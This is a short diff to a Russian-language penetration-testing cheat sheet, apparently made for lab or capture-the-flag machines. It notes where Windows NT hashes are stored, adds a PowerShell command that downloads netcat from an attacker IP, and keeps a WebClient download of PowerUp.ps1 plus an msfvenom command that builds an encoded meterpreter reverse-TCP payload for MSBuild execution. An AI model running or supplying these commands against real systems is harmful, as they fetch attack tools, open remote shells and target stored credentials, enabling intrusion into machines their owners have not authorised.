@@ -4,7 +4,10 @@
   
   NT хеши по дефолту храняться в Windows/System32/config/SPA
   
-  Powershell команда для скачивания файлов: $client = new-object System.Net.WebClient
+  Powershell команда для скачивания файлов:  PowerShell iwr http://10.10.13.245:8000/nc.exe -OutFile C:\\Users\\Public\\ncc.exe
+  
+  
+                                            $client = new-object System.Net.WebClient
                                             $client.DownloadFile("http://10.10.13.182:8000/PowerUp.ps1","C:\Users\amanda\Documents\PowerUp.ps1")
   
   C помощью этого можно провести meterpreter на машину (https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml)    (msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 21 LHOST=10.10.14.43 LPORT=4444 -f csharp)
